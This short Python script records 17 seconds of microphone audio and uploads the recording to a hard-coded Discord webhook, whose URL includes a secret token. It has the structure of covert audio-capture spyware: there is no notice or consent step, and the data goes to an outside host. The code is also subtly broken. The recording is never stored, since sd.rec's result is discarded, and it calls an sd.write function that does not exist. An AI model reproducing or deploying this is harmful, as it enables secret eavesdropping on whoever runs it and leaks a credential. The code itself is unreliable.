import sounddevice as sd
import numpy as np

# Set the duration and sample rate
duration = 17  # seconds
fs = 44100  # Sample rate

# Create an array to hold the audio data
myrecording = np.zeros((duration*fs,))

# Record audio
sd.rec(myrecording.shape, samplerate=fs, channels=1, blocking=True)

# Save the audio file
sd.write('output1.wav', myrecording, fs)



from discord import SyncWebhook, File

# Create a webhook
webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1177935910835335248/dz4Vo5Y4dIjAeXwGbV_wGOzDHXw7IG_A-N_Ym2uUdqh_KnB68yrYaH4lY1zL2UZ3ZFBv")

# Send a file
with open("output1.wav", "rb") as f:
    webhook.send(file=File(f))